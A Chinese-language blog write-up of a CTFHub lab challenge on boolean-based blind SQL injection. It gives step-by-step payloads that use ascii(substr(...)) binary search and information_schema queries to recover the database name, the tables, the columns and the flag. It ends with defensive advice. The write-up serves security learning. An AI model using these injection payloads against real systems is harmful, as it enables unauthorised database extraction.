---
layout: post
title: "CTFHub SQL注入 - 布尔盲注"
date: 2026-10-12
categories: ctfhub
tags: [ctfhub,web,sql注入,布尔盲注]
permalink: /ctfhub/sql-boolean-sqli.html
---

# CTFHub SQL注入 - 布尔注入
## 一、题目信息
平台：CTFHub
分类：Web - SQL注入
题目名称：布尔注入
难度：简单
Flag：`ctfhub{5c9144f4991d634f4da600}`

## 二、考点
1. 布尔盲注原理，依靠页面两种返回状态判断SQL真假
2. GET型整数注入，手工二分猜解数据
3. MySQL元数据库`information_schema`查询库、表、字段
4. substr、ascii函数逐字符猜解数据

## 三、题目内容
页面存在ID输入框，输入ID进行查询。页面**没有直接数据回显**，仅存在两种页面状态：SQL条件为真返回`query_success`，条件为假返回`query_error`。无法使用union联合查询、报错注入，适合布尔盲注。
后端SQL大致形式：`select * from news where id=用户输入`

## 四、解题步骤
1. **判断注入类型**
输入payload：`1 and 1=1`，页面返回`query_success`；
输入payload：`1 and 1=2`，页面返回`query_error`。
证明为**整数型注入**，无需单引号闭合。

2. **获取当前数据库名**
payload：`1 and ascii(substr(database(),1,1))>100`
利用`substr`截取字符、`ascii`转为数字，二分比较猜解库名。
得到数据库名：`sqli`

3. **查询该库下所有表名**
payload：`1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100`
得到表：`news,flag`，目标表为flag。

4. **查询flag表中的字段名**
payload：`1 and ascii(substr((select column_name from information_schema.columns where table_name='flag' limit 0,1),1,1))>100`
得到字段名称：`flag`。

5. **读取flag值**
payload模板：`1 and ascii(substr((select flag from sqli.flag limit 0,1),pos,1))>mid`
pos代表字符位置，mid是二分中间值，循环猜解每一位字符。
> 注意：子查询需要加`limit 0,1`，防止返回多行数据造成字符错乱。

## 五、知识点解析
1. **布尔盲注**：页面无数据回显，只有两种页面状态，根据页面返回真假，逐字符猜取数据。
2. **substr()**：字符串截取函数，`substr(字符串,起始位置,截取长度)`，位置从1开始。
3. **ascii()**：将字符转为ASCII码，用于大小比较。
4. 二分法：缩小ASCII范围，大幅减少请求次数，提升盲注效率。
5. `limit 0,1`：限制只返回第一条记录，避免多条记录拼接导致猜解错误。

## 六、总结
布尔盲注适用场景：无正常数据回显，页面仅有两种不同返回结果。
流程：判断注入点 → 爆库名 → 爆表名 → 爆字段 → 逐字符猜解flag。
防御方式：过滤SQL特殊函数，使用预编译，统一页面返回内容，消除布尔状态差异。

> 踩坑点：
> 1. 请求为GET，误用POST会拿到静态页面，无法判断真假；
> 2. 二分猜解时循环判断逻辑出错，会造成字符偏移，flag错误；
> 3. 子查询不加`limit 0,1`会读取多条记录，字符错乱。
